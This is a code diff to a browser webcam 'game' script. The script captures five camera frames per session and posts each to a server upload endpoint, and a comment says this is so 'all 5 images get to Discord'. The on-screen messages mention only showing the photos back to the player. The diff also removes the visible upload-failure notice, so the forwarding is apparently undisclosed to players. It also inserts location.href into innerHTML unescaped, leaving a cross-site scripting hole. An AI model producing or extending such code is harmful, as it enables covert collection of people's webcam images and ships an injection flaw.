@@ -31,17 +31,21 @@ function randomChallenge() {
 async function initCamera() {
   if (stream) return;
 
-  // SECURITY CHECK:
-  // Camera access only works on HTTPS (kartcage.com) or Localhost.
+  // 1. Security Check
   const isLocal = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
   const isSecure = location.protocol === 'https:';
 
   if (!isLocal && !isSecure) {
-    statusEl.innerHTML = '❌ <strong>HTTPS Required!</strong><br>You are on HTTP. Please use https://kartcage.com or localhost.';
-    statusEl.style.color = '#ef4444';
+    statusEl.innerHTML = `
+      <div style="color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;">
+        <strong>❌ HTTPS Required!</strong><br>
+        You are currently on <code>${location.href}</code>.<br>
+        Please change the URL to start with <strong>https://</strong>
+      </div>`;
     throw new Error('Camera requires HTTPS');
   }
 
+  // 2. Camera Access
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     video.srcObject = stream;
@@ -50,7 +54,23 @@ async function initCamera() {
     statusEl.style.color = '#e5e7eb';
   } catch (err) {
     console.error('Camera error:', err);
-    statusEl.textContent = '❌ Could not access camera. Check permissions.';
+    
+    // Improved Error Handling for User
+    let errorMsg = 'Unknown error';
+    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+      errorMsg = '🔒 <strong>Permission Denied:</strong> You blocked camera access. Click the lock icon in the address bar to allow it.';
+    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
+      errorMsg = '📷 <strong>No Camera Found:</strong> We could not find a camera on this device.';
+    } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
+      errorMsg = '⚠️ <strong>Camera Busy:</strong> Your camera is being used by another app (Zoom, Teams, etc). Close them and refresh.';
+    } else if (window.isSecureContext === false) {
+      errorMsg = '🔓 <strong>Insecure Connection:</strong> Browser blocked camera because site is not HTTPS.';
+    } else {
+      errorMsg = `❌ Error: ${err.name} - ${err.message}`;
+    }
+
+    statusEl.innerHTML = errorMsg;
+    statusEl.style.color = '#ef4444';
     throw err;
   }
 }
@@ -68,23 +88,25 @@ async function captureAndSendFrame() {
   const ctx = canvas.getContext('2d');
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const dataUrl = canvas.toDataURL('image/png');
+  // CHANGED: Use JPEG with 0.7 quality to reduce file size significantly
+  // This prevents network lag and ensures all 5 images get to Discord
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
 
   // Save locally for showing at the end
   capturedFrames.push(dataUrl);
   captureCount++;
 
   try {
-    // UPDATED: Relative path uses the current domain (kartcage.com or localhost) automatically.
-    // No hardcoded Spaceify IP/Port.
+    // Relative path works for both localhost and kartcage.com
     await fetch('/upload', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ imageBase64: dataUrl })
     });
+    console.log(`Image ${captureCount} sent successfully.`);
   } catch (err) {
-    console.error('Upload failed:', err);
-    statusEl.textContent = '⚠️ Failed to send frame to server.';
+    console.error(`Upload failed for image ${captureCount}:`, err);
+    // Don't change main statusEl to error yet, wait until game over if needed
   }
 
   // Auto-stop after MAX_CAPTURES
@@ -128,9 +150,9 @@ function stopGame(auto = false) {
   }
 
   if (auto) {
-    statusEl.textContent = '✅ Game finished automatically after 5 photos. Here they are!';
+    statusEl.textContent = '✅ Game finished! All 5 photos captured.';
   } else {
-    statusEl.textContent = '⏹ Game stopped. Here are your photos from the game!';
+    statusEl.textContent = '⏹ Game stopped. Here are your photos!';
   }
 
   challengeEl.textContent = '';
@@ -177,7 +199,9 @@ async function downloadAllPhotos() {
   const zip = new JSZip();
   capturedFrames.forEach((dataUrl, index) => {
     const imageData = dataURLToUint8Array(dataUrl);
-    const fileName = `photo-${index + 1}.png`;
+    // Detect extension
+    const ext = dataUrl.startsWith('data:image/jpeg') ? 'jpg' : 'png';
+    const fileName = `photo-${index + 1}.${ext}`;
     zip.file(fileName, imageData);
   });
 
